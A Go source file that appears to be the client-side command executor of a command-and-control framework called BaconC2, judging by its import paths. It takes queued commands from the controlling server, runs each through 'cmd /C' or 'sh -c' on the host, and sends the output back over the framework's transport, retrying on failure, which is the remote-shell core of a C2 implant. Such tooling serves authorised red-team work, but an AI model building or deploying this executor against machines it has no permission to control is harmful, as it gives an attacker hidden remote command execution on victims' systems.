package executor

import (
	"bytes"
	"fmt"
	"os/exec"
	"runtime"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/client/queue"
)

type DefaultCommandExecutor struct {
	queue     queue.CommandQueue
	transport models.ITransportProtocol
	agentID   string
}

func NewDefaultCommandExecutor(queue queue.CommandQueue, transport models.ITransportProtocol, agentID string) models.ICommandExecutor {
	return &DefaultCommandExecutor{
		queue:     queue,
		transport: transport,
		agentID:   agentID,
	}
}

func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.Command {
	result := models.Command{
		ID:      cmd.ID,
		Command: cmd.Command,
	}

	var execCmd *exec.Cmd
	if isWindows() {
		execCmd = exec.Command("cmd", "/C", cmd.Command)
	} else {
		execCmd = exec.Command("sh", "-c", cmd.Command)
	}

	var stdout, stderr bytes.Buffer
	execCmd.Stdout = &stdout
	execCmd.Stderr = &stderr

	err := execCmd.Run()
	if err != nil {
		result.Status = "error"
		result.Output = stderr.String()
	} else {
		result.Status = "success"
		result.Output = stdout.String()
	}

	return result
}

func (e *DefaultCommandExecutor) ProcessCommandQueue() {
	for {
		cmd, ok := e.queue.Get()
		if !ok {
			time.Sleep(1 * time.Second)
			continue
		}

		// Execute the command
		result := e.Execute(cmd)

		// Send the result back to the server
		if err := e.transport.SendResult(e.agentID, result); err != nil {
			fmt.Printf("Error sending result for command %s: %v\n", cmd.ID, err)
			// Re-queue the command on failure
			if err := e.queue.Add(cmd); err != nil {
				fmt.Printf("Error re-queuing command %s: %v\n", cmd.ID, err)
			}
		}

		time.Sleep(100 * time.Millisecond) // Prevent tight loop
	}
}

func isWindows() bool {
	return runtime.GOOS == "windows"
}
